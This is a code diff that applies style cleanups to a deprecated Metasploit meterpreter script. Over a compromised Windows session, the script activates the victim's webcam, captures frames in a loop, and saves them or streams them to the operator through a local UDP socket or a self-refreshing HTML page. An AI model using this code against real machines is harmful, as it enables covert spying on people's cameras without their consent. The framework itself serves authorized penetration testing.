@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #  Author: scriptjunkie
 #
@@ -31,7 +31,7 @@ index = 1
 interval = 1000
 gui = false
 saveAll = false
-opts.parse(args) { |opt, idx, val|
+opts.parse(args) do |opt, _idx, val|
   case opt
   when "-h"
     print_line "webcam -- view webcam over session"
@@ -58,15 +58,15 @@ opts.parse(args) { |opt, idx, val|
   when "-a"
     saveAll = true
   end
-}
+end
 
-if !(client.platform =~ /win32|win64/)
+unless client.platform =~ /win32|win64/
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
 begin
   camlist = client.webcam.webcam_list
-  if camlist.length == 0
+  if camlist.empty?
     print_error("Error: no webcams found!")
     raise Rex::Script::Completed
   elsif camlist.length < index
@@ -76,57 +76,57 @@ begin
   print_line("[*] Starting webcam #{index}: #{camlist[index - 1]}")
   client.webcam.webcam_start(index)
 
-  #prepare output
-  if(gui)
+  # prepare output
+  if gui
     sock = Rex::Socket::Udp.create(
-        'PeerHost' => "127.0.0.1",
-        'PeerPort' => 16235
-      )
+      'PeerHost' => "127.0.0.1",
+      'PeerPort' => 16235
+    )
   end
   imagepath = folderpath + ::File::SEPARATOR + "webcam-" + iterator.to_s.rjust(5, "0") + ".jpg"
-  print_line( "[*] imagepath is #{imagepath}" )
+  print_line("[*] imagepath is #{imagepath}")
   htmlpath = folderpath + ::File::SEPARATOR + "webcam.htm"
   begin
     if single == true
       data = client.webcam.webcam_get_frame(quality)
-      if(gui)
+      if gui
         sock.write(data)
       else
-        ::File.open( imagepath, 'wb' ) do |fd|
-          fd.write( data )
+        ::File.open(imagepath, 'wb') do |fd|
+          fd.write(data)
         end
-        path = ::File.expand_path( imagepath )
-        print_line( "[*] Image saved to : #{path}" )
-        Rex::Compat.open_file( path )
+        path = ::File.expand_path(imagepath)
+        print_line("[*] Image saved to : #{path}")
+        Rex::Compat.open_file(path)
       end
     else
-      if(!gui)
-        ::File.open(htmlpath, 'wb' ) do |fd|
-	  htmlOut = "<html><body><img src=\"webcam-" + iterator.to_s.rjust(5, "0") + ".jpg\"></img><script>setInterval('location.reload()',#{interval});</script></body><html>"
-	   fd.write(htmlOut)
+      unless gui
+        ::File.open(htmlpath, 'wb') do |fd|
+          htmlOut = "<html><body><img src=\"webcam-" + iterator.to_s.rjust(5, "0") + ".jpg\"></img><script>setInterval('location.reload()',#{interval});</script></body><html>"
+          fd.write(htmlOut)
         end
-        print_line( "[*] View live stream at: #{htmlpath}" )
+        print_line("[*] View live stream at: #{htmlpath}")
         Rex::Compat.open_file(htmlpath)
-        print_line( "[*] Image saved to : #{imagepath}" )
+        print_line("[*] Image saved to : #{imagepath}")
       end
-      while true do
+      loop do
         data = client.webcam.webcam_get_frame(quality)
-        if(gui)
+        if gui
           sock.write(data)
         else
-          ::File.open( imagepath, 'wb' ) do |fd|
-            fd.write( data )
-        ::File.open(htmlpath, 'wb' ) do |fd|
-	  htmlOut = "<html><body><img src=\"webcam-" + iterator.to_s.rjust(5, "0") + ".jpg\"></img><script>setInterval('location.reload()',#{interval});</script></body><html>"
-	   fd.write(htmlOut)
-	    if(saveAll)
-              iterator = iterator + 1
-              imagepath = folderpath + ::File::SEPARATOR + "webcam-" + iterator.to_s.rjust(5, "0") + ".jpg"
+          ::File.open(imagepath, 'wb') do |fd|
+            fd.write(data)
+            ::File.open(htmlpath, 'wb') do |fd|
+              htmlOut = "<html><body><img src=\"webcam-" + iterator.to_s.rjust(5, "0") + ".jpg\"></img><script>setInterval('location.reload()',#{interval});</script></body><html>"
+              fd.write(htmlOut)
+              if saveAll
+                iterator += 1
+                imagepath = folderpath + ::File::SEPARATOR + "webcam-" + iterator.to_s.rjust(5, "0") + ".jpg"
+                    end
             end
+          end
         end
-      end
-        end
-        select(nil, nil, nil, interval/1000.0)
+        select(nil, nil, nil, interval / 1000.0)
       end
     end
   rescue ::Interrupt
@@ -135,7 +135,7 @@ begin
   end
   print_line("[*] Stopping webcam")
   client.webcam.webcam_stop
-  sock.close if sock != nil
+  sock&.close
 rescue ::Exception => e
   print_error("Error: #{e.class} #{e} #{e.backtrace}")
 end
